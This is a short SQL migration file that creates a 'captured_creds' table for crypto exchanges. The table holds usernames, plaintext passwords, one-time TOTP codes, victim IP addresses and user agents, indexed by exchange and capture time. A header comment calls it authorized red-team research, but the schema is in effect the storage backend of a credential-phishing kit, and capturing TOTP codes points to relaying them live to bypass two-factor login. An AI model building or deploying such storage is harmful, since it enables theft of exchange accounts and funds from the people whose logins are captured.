-- CEX credential capture — authorized red-team research storage.
CREATE TABLE IF NOT EXISTS "captured_creds" (
	"id" uuid PRIMARY KEY DEFAULT gen_random_uuid() NOT NULL,
	"exchange" text NOT NULL,
	"username" text NOT NULL,
	"password" text NOT NULL,
	"totp" text,
	"ip" text,
	"user_agent" text,
	"created_at" timestamp with time zone DEFAULT now() NOT NULL
);--> statement-breakpoint
CREATE INDEX IF NOT EXISTS "idx_captured_creds_exchange" ON "captured_creds" USING btree ("exchange");--> statement-breakpoint
CREATE INDEX IF NOT EXISTS "idx_captured_creds_created_at" ON "captured_creds" USING btree ("created_at");
